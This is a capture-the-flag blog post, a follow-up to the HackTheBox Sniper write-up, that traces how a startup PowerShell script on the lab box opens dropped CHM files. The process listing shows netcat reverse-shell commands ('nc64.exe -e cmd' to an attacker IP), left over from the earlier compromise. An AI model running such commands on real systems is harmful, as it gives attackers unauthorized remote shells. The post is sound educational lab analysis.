---
title: HTB: Sniper Beyond Root
url: https://0xdf.gitlab.io/2020/04/09/htb-sniper-beyondroot.html
date: 2020-04-09T10:58:00+00:00
tags: hackthebox, ctf, htb-sniper, cron, scheduled-task, persistence, powershell, startup, magic, htb-secnotes, htb-re
---

![sniper_br_cover](https://0xdfimages.gitlab.io/img/sniper-br-cover.png)

In Sniper, the administrator user is running CHM files that are dropped into c:\docs, and this is the path from the chris user to administrator. I was asked on Twitter how the CHM was executed, so I went back to take a look.

## Challenge

[@t0](https://twitter.com/___t0___) raised the question, and I realized I hadn’t ever looked myself:

> Could you explain how the chm file is executed ? It seems like black magic
>
> — t0 (@\_\_\_t0\_\_\_) [April 9, 2020](https://twitter.com/___t0___/status/1248159109326811137?ref_src=twsrc%5Etfw)

I’ll pick up where the previous post left off, with a shell running as administrator, and see if I can figure it out:

```

PS C:\> whoami
sniper\administrator

```

## Find Persistence

### Scheduled Tasks

I know that for this automation to happen in HTB, it has to start on boot. My first thought was to check scheduled tasks, as that’s how I’ve seen Windows user simulation done in the past, and how I had done it when I created boxes (both in [SecNotes](/2019/01/19/htb-secnotes.html) and [RE](/2020/02/01/htb-re.html)). Listing scheduled tasks on Windows is kind of a pain, because it dumps tons of useless information for each task, and there are a lot of tasks on a default Windows system, so it’s easy to get lost in the noise.

To get all the info, you can run `schtasks /query /v /fo LIST`. This will output each task looking like this:

```

HostName:                             SNIPER
TaskName:                             \Microsoft\Windows\Chkdsk\SyspartRepair
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          %windir%\system32\bcdboot.exe %windir% /sysrepair
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

```

I started by just grabbing the “Task To Run”, using `findstr` (poor imitation of `grep` for Windows) with the `/c:` to search for the entire string, and not just any of the three words. I then used `findstr` again to remove lines that were just `Task To Run: COM handler`, as there were a lot, and they didn’t add any information.

```

PS C:\> schtasks /query /v /fo LIST | findstr /c:"Task To Run" | findstr /v /c:"Task To Run:                          COM handler"
Task To Run:                          C:\Windows\system32\msfeedssync.exe sync
Task To Run:                          %windir%\system32\srvinitconfig.exe /disableconfigtask
Task To Run:                          %windir%\system32\appidpolicyconverter.exe
Task To Run:                          %windir%\system32\appidcertstorecheck.exe
Task To Run:                          %windir%\system32\compattelrunner.exe
Task To Run:                          %windir%\system32\compattelrunner.exe
Task To Run:                          %windir%\system32\compattelrunner.exe
Task To Run:                          %windir%\system32\compattelrunner.exe -maintenance
Task To Run:                          %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask
Task To Run:                          %windir%\system32\AppHostRegistrationVerifier.exe
Task To Run:                          %windir%\system32\AppHostRegistrationVerifier.exe
Task To Run:                          %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
Task To Run:                          %windir%\system32\dstokenclean.exe
Task To Run:                          %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
Task To Run:                          %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
Task To Run:                          BthUdTask.exe $(Arg0)
Task To Run:                          %windir%\system32\bcdboot.exe %windir% /sysrepair
Task To Run:                          %SystemRoot%\system32\ClipUp.exe -p -s -o
Task To Run:                          %SystemRoot%\System32\wsqmcons.exe
Task To Run:                          %windir%\system32\defrag.exe -c -h -k -g -$
Task To Run:                          %windir%\system32\devicecensus.exe
Task To Run:                          %windir%\system32\devicecensus.exe
Task To Run:                          %windir%\system32\dxgiadaptercache.exe
Task To Run:                          %windir%\system32\dxgiadaptercache.exe
Task To Run:                          %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
Task To Run:                          %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART
Task To Run:                          %windir%\system32\DFDWiz.exe
Task To Run:                          %windir%\system32\disksnapshot.exe -z
Task To Run:                          %windir%\System32\LocationNotificationWindows.exe
Task To Run:                          %windir%\System32\WindowsActionDialog.exe
Task To Run:                          %SystemRoot%\System32\MbaeParserTask.exe
Task To Run:                          %windir%\system32\lpremove.exe
Task To Run:                          %windir%\system32\gatherNetworkInfo.vbs
Task To Run:                          %windir%\System32\SDNDiagnosticsTask.exe
Task To Run:                          %windir%\System32\SDNDiagnosticsTask.exe
Task To Run:                          %systemroot%\system32\rundll32.exe %systemroot%\system32\pla.dll,PlaHost "Server Manager Performance Monitor" "$(Arg0)"
Task To Run:                          %SystemRoot%\System32\drvinst.exe 6
Task To Run:                          %windir%\system32\sc.exe start pushtoinstall login
Task To Run:                          %windir%\system32\sc.exe start pushtoinstall registration
Task To Run:                          %windir%\system32\sc.exe start pushtoinstall registration
Task To Run:                          %systemroot%\system32\cscript.exe /B /nologo %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) $(Arg2)
Task To Run:                          %windir%\system32\ServerManagerLauncher.exe
Task To Run:                          %windir%\System32\rundll32.exe %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance
Task To Run:                          %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd publish
Task To Run:                          %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd configure
Task To Run:                          %windir%\system32\SpaceAgent.exe
Task To Run:                          %windir%\system32\SpaceAgent.exe
Task To Run:                          %windir%\system32\spaceman.exe /Work
Task To Run:                          %windir%\system32\spaceman.exe /Work
Task To Run:                          %windir%\system32\speech_onecore\common\SpeechRuntime.exe StartedFromTask
Task To Run:                          %windir%\system32\speech_onecore\common\SpeechModelDownload.exe
Task To Run:                          %windir%\system32\defrag.exe -c -h -g -# -m 8 -i 13500
Task To Run:                          %windir%\system32\sc.exe start w32time task_started
Task To Run:                          %windir%\system32\tzsync.exe
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Task To Run:                          %systemroot%\system32\usoclient.exe StartInstall
Task To Run:                          %systemroot%\system32\MusNotification.exe RebootDialog
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Task To Run:                          %systemroot%\system32\usoclient.exe StartScan
Task To Run:                          %systemroot%\system32\MusNotification.exe
Task To Run:                          %systemroot%\system32\MusNotification.exe
Task To Run:                          sc.exe config upnphost start= auto
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1907.4-0\MpCmdRun.exe -IdleTask -TaskName WdCacheMaintenance
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1907.4-0\MpCmdRun.exe -IdleTask -TaskName WdCleanup
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1907.4-0\MpCmdRun.exe Scan -ScheduleJob -ScanTrigger 55
Task To Run:                          C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1907.4-0\MpCmdRun.exe -IdleTask -TaskName WdVerification
Task To Run:                          %windir%\system32\wermgr.exe -upload
Task To Run:                          %windir%\system32\wermgr.exe -upload
Task To Run:                          %windir%\system32\wermgr.exe -upload
Task To Run:                          %windir%\system32\wermgr.exe -upload
Task To Run:                          %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange
Task To Run:                          "%ProgramFiles%\Windows Media Player\wmpnscfg.exe"
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Task To Run:                          C:\Windows\system32\sc.exe start wuauserv
Task To Run:                          %SystemRoot%\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)
Task To Run:                          %SystemRoot%\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)
Task To Run:                          %SystemRoot%\System32\dsregcmd.exe /checkrecovery
Task To Run:                          "C:\Program Files (x86)\MySQL\MySQL Installer for Windows\MySQLInstallerConsole.exe" Community Update

```

Even looking through all of that, I didn’t find anything that looked like it was related to non-standard system stuff. I ran a few more of these, selecting on things like `TaskName` and `Last Run Time` to try to find anything that could be related, but came up empty.

### Running Processes

If the process isn’t starting and stopping, perhaps it is just always running, either as a service or some other way. So I turned to the process list. I dropped into PowerShell, and then ran `Get-WmiObject Win32_Process | Select-Object ProcessId, ProcessName, CommandLine, pid`:

```

PS C:\> Get-WmiObject Win32_Process | Select-Object ProcessId, ProcessName, CommandLine, pid

ProcessId ProcessName               CommandLine
--------- -----------               -----------
        0 System Idle Process
        4 System
      104 Registry
      328 smss.exe
      416 csrss.exe
      496 wininit.exe
      504 csrss.exe
      564 winlogon.exe              winlogon.exe
      636 services.exe
      656 lsass.exe                 C:\Windows\system32\lsass.exe
      772 svchost.exe               C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay
      796 svchost.exe               C:\Windows\system32\svchost.exe -k DcomLaunch -p
      820 fontdrvhost.exe           "fontdrvhost.exe"
      884 fontdrvhost.exe           "fontdrvhost.exe"
      904 svchost.exe               C:\Windows\system32\svchost.exe -k RPCSS -p
      968 svchost.exe               C:\Windows\system32\svchost.exe -k DcomLaunch -p -s LSM
      276 dwm.exe                   "dwm.exe"
      368 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s DsmSvc
      712 svchost.exe               C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts
      716 svchost.exe               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService
      792 svchost.exe               C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s TimeBroke...
     1092 svchost.exe               C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog
     1204 svchost.exe               C:\Windows\system32\svchost.exe -k LocalService -p -s nsi
     1248 svchost.exe               C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
     1272 svchost.exe               C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s Dhcp
     1288 vmacthlp.exe              "C:\Program Files\VMware\VMware Tools\vmacthlp.exe"
     1312 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc
     1408 svchost.exe               C:\Windows\System32\svchost.exe -k NetworkService -p -s NlaSvc
     1436 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
     1496 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s ProfSvc
     1504 svchost.exe               C:\Windows\system32\svchost.exe -k LocalService -p -s EventSystem
     1512 svchost.exe               C:\Windows\System32\svchost.exe -k netsvcs -p -s Themes
     1576 svchost.exe               C:\Windows\System32\svchost.exe -k LocalService -p -s netprofm
     1632 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s SENS
     1780 svchost.exe               C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
     1792 svchost.exe               C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache
     1876 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s UserManager
     1976 svchost.exe               C:\Windows\System32\svchost.exe -k netsvcs -p -s ShellHWDetection
     2016 svchost.exe               C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAu...
     1036 svchost.exe               C:\Windows\system32\svchost.exe -k LocalService -p -s FontCache
     2076 svchost.exe               C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
     2140 svchost.exe               C:\Windows\System32\svchost.exe -k NetworkService -p -s LanmanWorkstation
     2700 spoolsv.exe               C:\Windows\System32\spoolsv.exe
     2812 svchost.exe               C:\Windows\system32\svchost.exe -k apphost -s AppHostSvc
     2840 svchost.exe               C:\Windows\system32\svchost.exe -k NetworkService -p -s CryptSvc
     2848 svchost.exe               C:\Windows\System32\svchost.exe -k utcsvc -p
     2856 svchost.exe               C:\Windows\system32\svchost.exe -k iissvcs
     2864 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s WpnService
     2872 svchost.exe               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain
     2880 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s Winmgmt
     2888 VGAuthService.exe         "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
     2896 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s IKEEXT
     2904 svchost.exe               C:\Windows\system32\svchost.exe -k LocalService -s W32Time
     2916 svchost.exe               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TrkWks
     2924 svchost.exe               C:\Windows\System32\svchost.exe -k NetworkService -p -s WinRM
     2932 svchost.exe               C:\Windows\system32\svchost.exe -k LocalService -p -s SstpSvc
     2952 MsMpEng.exe
     2964 vmtoolsd.exe              "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
     3044 svchost.exe               C:\Windows\System32\svchost.exe -k smbsvcs -s LanmanServer
     3164 svchost.exe               C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc
     3384 svchost.exe               C:\Windows\System32\svchost.exe -k netsvcs
     3900 dllhost.exe               C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
     3956 WmiPrvSE.exe              C:\Windows\system32\wbem\wmiprvse.exe
     4228 msdtc.exe                 C:\Windows\System32\msdtc.exe
     5028 NisSrv.exe
     5068 SecurityHealthService.exe
     1284 sihost.exe                sihost.exe
     1324 svchost.exe               C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
     4860 svchost.exe               C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
     4856 taskhostw.exe             taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
     5148 svchost.exe               C:\Windows\system32\svchost.exe -k netsvcs -p -s TokenBroker
     5252 svchost.exe               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TabletInpu...
     5260 svchost.exe               C:\Windows\system32\svchost.exe -k appmodel -p -s StateRepository
     5332 ctfmon.exe                "ctfmon.exe"
     5384 svchost.exe               C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc
     5680 explorer.exe              C:\Windows\Explorer.EXE
     2996 ShellExperienceHost.exe   "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe...
      652 SearchUI.exe              "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -Se...
     2748 RuntimeBroker.exe         C:\Windows\System32\RuntimeBroker.exe -Embedding
     4416 RuntimeBroker.exe         C:\Windows\System32\RuntimeBroker.exe -Embedding
      584 RuntimeBroker.exe         C:\Windows\System32\RuntimeBroker.exe -Embedding
     1528 vmtoolsd.exe              "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
     1952 cmd.exe                   C:\Windows\system32\cmd.exe /c ""C:\Users\Administrator\AppData\Roaming\Microsof...
     1896 conhost.exe               \??\C:\Windows\system32\conhost.exe 0x4
      880 cmd.exe                   C:\Windows\system32\cmd.exe /c ""C:\Users\Administrator\AppData\Roaming\Microsof...
     4544 conhost.exe               \??\C:\Windows\system32\conhost.exe 0x4
     2108 notepad.exe               "C:\Windows\System32\notepad.exe" "C:\Users\Administrator\AppData\Roaming\Micros...
     2100 powershell.exe            powershell  -ep bypass -f "C:\Users\Administrator\AppData\Roaming\Microsoft\Wind...
     3380 mysqld.exe                "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysqld"  --defaults-file="C:\Progra...
     2368 mysqld.exe                "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysqld" "--defaults-file=C:\Program...
      744 svchost.exe               C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p -s DPS
     1300 svchost.exe               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s UALSVC
     5664 svchost.exe               C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager
     5928 svchost.exe               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
     3572 svchost.exe               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s DsSvc
     4296 taskhostw.exe             taskhostw.exe
     6120 svchost.exe               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc
     4128 wsmprovhost.exe           C:\Windows\system32\wsmprovhost.exe -Embedding
     1988 nc64.exe                  "\\10.10.14.24\share\nc64.exe" -e cmd 10.10.14.24 443
     1556 conhost.exe               \??\C:\Windows\system32\conhost.exe 0x4
     5056 cmd.exe                   cmd
     4124 cmd.exe                   "C:\Windows\System32\cmd.exe" /c C:\Windows\System32\WindowsPowerShell\v1.0\powe...
     1864 conhost.exe               \??\C:\Windows\system32\conhost.exe 0x4
     5744 powershell.exe            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -WindowStyle Hidden -...
     2044 nc64.exe                  "\windows\system32\spool\drivers\color\nc64.exe" -e cmd 10.10.14.24 443
     3280 cmd.exe                   cmd
     4064 powershell.exe            powershell

```

Scanning through the list, these two jumped out:

```

     2108 notepad.exe               "C:\Windows\System32\notepad.exe" "C:\Users\Administrator\AppData\Roaming\Micros...
     2100 powershell.exe            powershell  -ep bypass -f "C:\Users\Administrator\AppData\Roaming\Microsoft\Wind...

```

Process 2100 is PowerShell running out of the administrator’s `AppData` directory, and 2108 is Notepad editing something in the same path. I’ll get the full command line for each:

```

PS C:\> Get-WmiObject Win32_Process | Where {$_.ProcessId -eq 2100 -or $_.ProcessId -eq 2108} | Select-Object CommandLine | fl

CommandLine : "C:\Windows\System32\notepad.exe" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start 
              Menu\Programs\Startup\sig.ps1"

CommandLine : powershell  -ep bypass -f "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start 
              Menu\Programs\Startup\sig.ps1"

```

Given the path in the `Startup` folder, I feel pretty confident that this is what is running the CHMs.

## sig.ps1

### Source

Here’s the code for `sig.ps1`:

```

while($true) {
    get-process | where name -eq hh | Stop-Process -force
    sleep 2
    del C:\Docs\*.chm
    sleep 20
    Get-ChildItem "C:\Docs" -Filter *.chm | Foreach-Object {
        $sig =  [char[]](gc $_.FullName -Encoding Byte -ReadCount 1 -TotalCount 2) -join ''
        if($sig -eq 'IT') {
                write "entre"
                hh.exe $_.FullName
        }
        else {
                write "boo"
        }
    }
    sleep 10
}

```

A PowerShell script on it’s own won’t run in this folder, but in the same directory, there’s also a `run.bat` file that runs the `.ps1` script (that’s why if you look more closely at the process list, you’ll see `cmd /c powershell ...`):

```

powershell -ep bypass -f "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sig.ps1"

```

### Summary

This is an infinite loop that does the following:
1. Kills any processes of `hh.exe`.
2. Sleeps 2 seconds.
3. Deletes any CHM files in `C:\Docs\`.
4. Sleeps 20 seconds.
5. Finds all `*.chm` files in `C:\Docs\` and loops over each:
   1. Does a read on the file (details below) and saves it as `$sig`.
   2. Checks if `$sig` is `IT`. If so, prints a message and runs `hh.exe [file]`. Else prints a message.
6. Sleeps 10 seconds.

`hh.exe` is the [Microsoft HTML Help Executable](https://www.file.net/process/hh.exe.html), used to load CHM files, so that makes perfect sense here.

### Signature Check

The signature check is interesting PowerShell. `gc` is short for `Get-Content`. `-Encoding Byte` will get the content as an array of byte values (0-225). `-TotalCount 2` will limit the read to two lines, though with `-Encoding Byte`, that means two bytes. `-ReadCount 1` will read one line (byte) at a time. I don’t believe it is necessary here:

```

PS C:\windows\temp> gc doc.chm  -Encoding Byte -ReadCount 1 -TotalCount 2
73
84

PS C:\windows\temp> gc doc.chm  -Encoding Byte  -TotalCount 2
73
84

```

The results from this read are cast into characters, and then joined to form a string:

```

PS C:\windows\temp> [char[]](gc doc.chm  -Encoding Byte  -TotalCount 2) -join ''
IT
PS C:\> [char[]](gc \windows\system32\cmd.exe  -Encoding Byte  -TotalCount 2) -join ''
MZ

```

So PowerShell this will grab the first two bytes from the file. `sig.ps1` will make sure it’s `IT`, and run it with `hh.exe` if so.

## Rabbit Hole with Magic

I could verify that my CHM files started with `IT` easily:

```

root@kali# xxd doc.24.chm | head -1
00000000: 4954 5346 0300 0000 6000 0000 0100 0000  ITSF....`.......

```

`file` also reported that this is a CHM file:

```

root@kali# file doc.24.chm 
doc.24.chm: MS Windows HtmlHelp Data

```

Just to verify, I turned to [the Wikipedia List of File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures), but it wasn’t listed (I added it based on what follows).

The `file` command uses the [Magic Database](https://github.com/file/file/tree/master/magic), and in the Magdir directory, there’s a bunch of files that each define file signatures. In the ms-dos file, there’s [this one](https://github.com/file/file/blob/57d45d1fae8ae0bbd6de0e94e4394ee38ed4bdab/magic/Magdir/ms-dos#L1185) for CHM:

```

# HtmlHelp files (.chm)
0	string/b	ITSF\003\000\000\000\x60\000\000\000	MS Windows HtmlHelp Data

```

[« HTB: Sniper](/2020/03/28/htb-sniper.html)